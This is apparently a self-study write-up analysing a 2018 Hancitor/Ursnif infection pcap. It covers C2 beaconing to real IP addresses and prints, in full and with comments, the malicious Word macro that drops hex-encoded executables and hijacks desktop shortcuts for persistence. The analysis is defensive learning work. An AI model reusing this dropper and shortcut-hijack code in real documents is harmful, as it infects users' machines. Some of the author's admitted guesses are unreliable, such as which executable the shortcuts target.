## INTRODUCTION
Often users while checking mails, may download files from a sender that looks promisable to them. Unknown of the fact that they are downloading malicious file on their system.

Site for reference: https://www.malware-traffic-analysis.net/2018/11/29/index.html

Given a pcap: 2018-11-29-Hancitor-infection-with-Ursnif.pcap.zip

password: infected_20181129

### Acknowledgement of pcap file(and resources):
#### Author: BRAD DUNCAN
#### Site: https://www.malware-traffic-analysis.net/

## THEORY
Hancitor, also known as Chanitor, is a malware designed to install other malware on targeted devices. Hancitor has been active since 2013, and was typically delivered as an attachment through spear-phishing emails with varying lure themes. However, from 2020 onwards, threat actors have been using DocuSign-themed lures to entice target users into opening links in emails, which then lead to another link that downloads a document with a malicious macro that contains the main Hancitor payload.

Once on the target device, Hancitor performs initial reconnaissance, connects to the attackers' command-and-control (C2) server, and downloads additional malware, including banking trojans like Zloader and Vawtrak, and information stealers like Pony and Ficker. In some campaigns, attackers have also used Hancitor to install Cobalt Strike or exploit CVE-2020-1472. In all these infections, Hancitor uses these tools to perform various malicious activities, including lateral movement, credential theft, and data exfiltration. (https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/Hancitor#:~:text=Hancitor%2C%20also%20known%20as%20Chanitor%2C%20is%20a%20malware,attachment%20through%20spear-phishing%20emails%20with%20varying%20lure%20themes.)

Urnsif is a banking trojan, stealer, and spyware, belonging to older malware families. 

In this pcap example, we observe how Hancitor installs Urnsif through a document containing a malicious macro (payload).

## INVESTIGATION
I activated the basic+ filter and began examining the GET requests.

![Screenshot 2024-07-22 124839](https://github.com/user-attachments/assets/f2022b54-8630-4a19-a100-15ef3674075f)

I followed the HTTP stream (right-click, follow, HTTP stream). 

![Screenshot 2024-07-22 124942](https://github.com/user-attachments/assets/c38a6fb5-16ea-4080-9660-9eef095f5b0e)

Next, we identified a document.

I continued to follow the HTTP stream of the second line.

![Screenshot 2024-07-22 200839](https://github.com/user-attachments/assets/6b08e00b-7fd7-4014-9b12-397a7a95069b)

The packet attempts to get a public address:

GUID=4520674659239663104&BUILD=29qni11&INFO=FANN-WIN-PC@FANN-WIN-PC\danny&IP=173.66.46.112&TYPE=1&WIN=6.1(x64)

> 2018-11-29 23:02:03 10.11.29.101 185.112.82.114 HTTP 415 POST /4/forum.php HTTP/1.1 (application/x-www-form-urlencoded)

In the next line, the client sends their GUID, build, PC username, IP, system type, and architecture as a POST request to 185.112.82.114, along with:

![Screenshot 2024-07-22 201323](https://github.com/user-attachments/assets/dcec800c-33ad-4e10-815f-7016b4157c79)

The string appears to be Base64-encoded, so I decoded it to a file.

> https://base64.guru/converter/decode/file

![Screenshot 2024-07-22 202113](https://github.com/user-attachments/assets/b774c83f-a05b-41fe-a755-f29963e5333b)

This resulted in a binary file with a MIME type of application/octet-stream. What could this signify?

![Screenshot 2024-07-22 204509](https://github.com/user-attachments/assets/26dc3607-3728-44df-ba82-e54a3333682c)

Following the next packet reveals:

![Screenshot 2024-07-22 204937](https://github.com/user-attachments/assets/4cba6f0d-f594-4ebc-812e-6f6ff909075d)

The MIME is text/html, but the content appears as gibberish (it could also be binary). The client uses a GET request to retrieve this file from 81.177.140.147.

In the basic+ filter, we can observe the SYN-ACK process between Src: 10.11.29.101 and Dst: 81.177.140.147, indicating that the file is being downloaded by the client. 

After the TCP data transfer:

2018-11-29 23:02:07 src:81.177.140.147 dst:10.11.29.101 HTTP 450 HTTP/1.1 200 OK (text/html)

The server acknowledges the client, responding with an OK.

Likewise its GETs from 81.177.140.147 these two more

> 2018-11-29 23:02:14	10.11.29.101	81.177.140.147	HTTP	227	GET /wp-includes/2 HTTP/1.1

> 2018-11-29 23:02:15	10.11.29.101	81.177.140.147	HTTP	227	GET /wp-includes/3 HTTP/1.1


Honestly futher in pcap there are more such communication, we are more interested in why its all occurring?

Remember our doc file we found? 

We would take a look into that!

## ANALYZING MALICIOUS CODE

Lets analyze malicious.doc,

<code>olevba malicious</code>


```
Option Explicit           
Private Sub Document_Open()                          
On Error Resume Next
Dim gdffs

gdffs = Environ("APPDATA") & "\"                                      //set gdffs as <appdata_directory>\

 If Dir(gdffs & "lkn", vbDirectory) = "" Then                         //if gdffs return (<appdata_directory>\lkn) null
                Open gdffs & "werd.exe" For Output As #1
    Print #1, HexToString(UserForm1.TextBox1.text)                    //input *[UserForm1.TextBox1.text] in string to werd.exe line 298 
    Close #1
   
          Open gdffs & "wird.exe" For Output As #1
    Print #1, HexToString(UserForm2.TextBox1.text)                    //input *[UserForm2.TextBox1.text] in string to wird.exe line 298
       Close #1
    Call finds                                                        //call finds() subroutine [line 134]
    Else

    End If
   
   
   End Sub


Sub finds()
On Error Resume Next
Dim strDirPath, strMaskSearch, strFileName As String           
Dim oWsh
Set oWsh = CreateObject("WScript.Shell")                             //create instance of object WScript.Shell
strDirPath = oWsh.SpecialFolders("Desktop")                          //returns back full path special folder called Desktop
strMaskSearch = "*.lnk*"


Dim s As String, s2 As String

    s = Environ("APPDATA") & "\lkn"

      MkDir s                                                      //create <appdata_directory>\lkn

Dim fso As Object
Set fso = VBA.CreateObject("Scripting.FileSystemObject")




Dim gdffs, iStr1

gdffs = Environ("APPDATA")                                        //assumming starting of <appdata_directory> is C:\
 iStr1 = Left(gdffs, 3) & "users\public\desktop"                  //C:\ + users\public\desktop = C:\users\public\desktop
strFileName = Dir(iStr1 & "/" & strMaskSearch)                    //find all windows shortcut (*.lnk*) in C:\users\public\desktop\

Do While strFileName <> ""                                        //run loop to find all windows shortcuts in C:\users\public\desktop\


FileCopy iStr1 & "\" & strFileName, s & "\" & strFileName         //copy contents of file C:\users\public\desktop\<file-iterator_n>.lnk to
                                                                  //<appdata_directory>\lkn\<file-iterator_n>.lnk
     Kill iStr1 & "\" & strFileName                               //kill the file C:\users\public\desktop\<file-iterator_n>.lnk
FileCopy s & "\" & strFileName, strDirPath & "\" & strFileName    //copy contents of <appdata_directory>\lkn\<file-iterator_n>.lnk to
                                                                  //<Desktop_directory>\<file-iterator_n>.lnk

    strFileName = Dir                                             //Dir returns back next iterator of matching file.
Loop                                                              //continue doing same for all shortcuts






strFileName = Dir(strDirPath & "/" & strMaskSearch)              //Serach all shortcuts in <Desktop_directory> return back shortcuts 

Do While strFileName <> ""                                       //loop through all the shortcuts found in <Desktop_directory>


FileCopy oWsh.SpecialFolders("Desktop") & "\" & strFileName, s & "\" & strFileName
                                                                 //copy contents files <Desktop_directory> to <appdata_directory>/lkn
Call MakeShortcut(strFileName, strFileName, s & "\" & strFileName, oWsh.SpecialFolders("Desktop"))
                                                                 //call MakeShortcut subroutine
  ' MsgBox strFileName

    strFileName = Dir
Loop
    Selection.WholeStory
    Selection.Copy
  Selection.TypeBackspace
  ActiveDocument.Save
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatXMLDocument
Application.Quit
End Sub

Sub MakeShortcut(pod, gfdgd, jojj, hhhhh)                            //pod = gfdgd = strFileName, jojj = <appdata_directory>/lkn/<file-shortcut_iterator> ,
                                                                     // hhhhh = <Desktop_directory>
Dim a, b, c, f, pos, pis, pas, pus, ppp, txt

Selection.InsertFile FileName:=jojj, Range:="", _                    //attach jojj to document (malicious)
        ConfirmConversions:=False, Link:=False, Attachment:=False

    Selection.WholeStory                                             //select whole document 
    Selection.Copy                                                   //copies it to clipboard
  Selection.TypeBackspace                                            //erase
    txt = ClipboardText                                              //txt = data stored to clipboard variable


   Dim sss, aaa, aaaa, ssss, aa, aas, aad
   
    ssss = InStr(1, txt, ":\")                                     //find first occurence of :\ in txt                                      
    aaaa = InStr(ssss + 5, txt, ":\")                              //find second occurence of :\
    aa = Mid(txt, aaaa - 1)                                        //takes out the string from from second occurence of :\ till end
    aas = Left(aa, 100)                                            //takes out 100 chracters from aa
    sss = InStr(1, aas, ".exe")                                    //find first occurence of ".exe" posistion
    aad = Left(aa, sss + 3)                                        //from second occurrence of :\ till .exe 


Dim kkk, xxx, ccc, vvv, bbb, nnn

kkk = InStr(sss - 20, aad, "\")                                    //starts seraching backwards for "\" 20 position from .exe

xxx = InStr(kkk + 1, aad, "\")                                     //find second \ from kkk


If xxx <> 0 Then
ccc = Mid(aad, xxx + 1)                                            //if xxx!=0, then ccc = :\ till second occurence \

Else
ccc = Mid(aad, kkk + 1)                                            //if xxx==0, no more found, ccc = :\ till \ occurence

End If

Dim oWsh
Dim myshortcut
Dim oShortcut
Dim strSplitFileName
Dim strTarget
Dim nShortName, strDirPath

Set oWsh = CreateObject("WScript.Shell")

strDirPath = oWsh.SpecialFolders("Desktop")


     Dim fsdf As String
     fsdf = Environ("APPDATA") & "\wird.exe"                        //<appdata_directory>\wird.exe                            




   Dim shell As Shell32.shell
    Dim folder As Shell32.folder
    Dim folderItem As Shell32.folderItem
    Dim shortcut As Shell32.ShellLinkObject                        //creating Shell32 objects
   
    Set shell = New Shell32.shell
   
    Set folder = shell.NameSpace(strDirPath)
    If Not folder Is Nothing Then                                 //checking <Desktop_directory> existence
        Set folderItem = folder.ParseName(pod)
        If Not folderItem Is Nothing Then
            Set shortcut = folderItem.GetLink                     //setting shortcut
            If Not shortcut Is Nothing Then
                shortcut.Path = fsdf                              //point the shortcut target path to <appdata_directory>\wird.exe
       
 

   shortcut.Arguments = """" & ccc & """" & " " & """" & jojj & """" //ccc is filename created through string manipulation and jojj is filename.shortcuts-iterator
                shortcut.SetIconLocation aad, 0
                 shortcut.Save                                    //I guess setting the icon and metadata and saving the shortcut
            End If
        End If
    End If
   
   
   

Set oWsh = Nothing                                                //releasing the memory
Set oShortcut = Nothing                                           //releasing the memory




End Sub

Function ClipboardText()
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}") //GUID(guess) of the instance IDataObject COM(component object model)
        .GetFromClipboard
        ClipboardText = .GetText                                 //gets text content from clipboard (I guess)
    End With
End Function


Public Function HexToString(ByVal HexToStr As String) As String

Dim strTemp   As String
Dim strReturn As String
Dim i As Long

For i = 1 To Len(HexToStr) Step 2                               //step 2 up every iteration
    strTemp = Chr$(Val("&H" & Mid$(HexToStr, i, 2)))            //convert substring to char
    strReturn = strReturn & strTemp
Next i
HexToString = Right(strReturn, Len(strReturn))
End Function
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm
in file: malicious - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub TextBox1_Change()

End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm
in file: malicious - OLE stream: 'Macros/VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)

```
<a href="https://learn.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/option-explicit-statement">[1]option-explicit-statement<a>
<a href="https://ss64.com/vb/special.html">[2]special-folders<a><a href="https://stackoverflow.com/questions/28118097/use-vba-to-insert-a-word-file-from-its-shortcut">[3]shortcuts<a> <a href="https://www.mrexcel.com/board/threads/vba-check-clipboard-text-before-pasting.889605/">[4]clipboard-text<a><a href="https://learn.microsoft.com/en-us/office/vba/api/overview/">[5]VBA-documnetation<a>

> NOTE olevba found this code in  ThisDocument.cls in macros/vba,

> ⚠️ I tried by best to understand the code, and comment out my understanding I might be wrong.

In summary,

#### 1. Opening the Document (Document_Open()):

The script triggers when the document is opened.
It checks if the directory <appdata_directory>\lkn exists. If not, it creates this directory and writes the content from UserForm1 and UserForm2 text boxes into werd.exe and wird.exe respectively.
It then calls the finds subroutine to manage shortcuts.
Creating Shortcuts and Managing Files (finds Subroutine):

#### 2. Shortcut Management:

The script creates a new directory (lkn) if it doesn’t already exist.
It searches for .lnk files (Windows shortcuts) in C:\users\public\desktop.
It copies these shortcuts to <appdata_directory>\lkn and then back to the desktop.
For each shortcut, it calls the MakeShortcut subroutine to modify or create shortcuts.
Making Shortcuts (MakeShortcut Subroutine):

#### 3. File Handling:
Inserts the shortcut file into the active document and copies its content to the clipboard.
Extracts information from the clipboard content to create new shortcuts.
Shortcut Creation:
Sets the path for the new shortcut to point to werd.exe and sets arguments and icon location.
Saves the new shortcut with the modified settings.
Obfuscation and Hex Conversion (HexToString Function):

Converts hexadecimal strings to ASCII text. This function helps in obfuscating the payload or data being used in the script.
Clipboard Handling (ClipboardText Function):

Retrieves text from the clipboard. This text is used to set up the file names for shortcuts.

### Summary of Key Points:

The script is indeed creating shortcuts that point to werd.exe and possibly other executables.
It checks for the existence of a specific directory and manages files and shortcuts based on its presence.
It uses hexadecimal conversion for obfuscation and interacts with clipboard data to generate file names or paths.
The VBA script is designed to automate actions that could facilitate the distribution or persistence of malicious payloads through the document.
Additional Considerations:
Persistence Mechanism: The script ensures that if it’s executed, it will create or modify shortcuts to ensure persistence by pointing to malicious executables.
Malicious Payload: The script potentially uses werd.exe and wird.exe as payloads that can be executed when the shortcuts are activated.

Here, IOC (Indicator of Compromise) indicated are as follows:

![Screenshot 2024-08-11 123605](https://github.com/user-attachments/assets/baad1383-ea0d-4026-a9fa-1253c0f67c87)


## WHAT MIGHT HAVE HAPPEN
The document named invoice_709263.doc may have been received via email or could be a trick. Upon opening, it may have attempted to access its public address, triggering wird.exe, as previously explained. This accounts for the subsequent interaction with unknown octet/stream files and data sent by the client. Often, Hanictor is accompanied by another malware, in this case, urnsif. When users receive malspam, they might download the document thinking it's legitimate. The activated document then tries to connect to a server to download additional malware to steal credentials.

In summary, 
The malspam message associated with the Hanictor (also known as Chanitor or Tordal) infection typically delivers a malicious document, such as a Microsoft Word or Excel file. When the victim opens the document and enables macros, the document's embedded macros or scripts will execute, often initiating the download of additional malware.

Malspam Message:

The initial email usually features an attachment or a link to download the malicious document, designed to manipulate the user into enabling macros through social engineering tactics.

Malicious Document:

When macros are enabled, the document generally doesn’t hold the complete payload (such as URSNIF or Pony); instead, the macro connects to a remote server to download the actual malware.

Supporting Malware:

The downloaded payload may be a banking trojan like URSNIF, a credential stealer like Pony, or other types of malware. The document's role is to act as a downloader, retrieving and executing additional malware on the victim's machine.


<a href="https://www.malware-traffic-analysis.net/2019/04/02/index.html">[6] In Summary<a>
with above link you can relate more,













































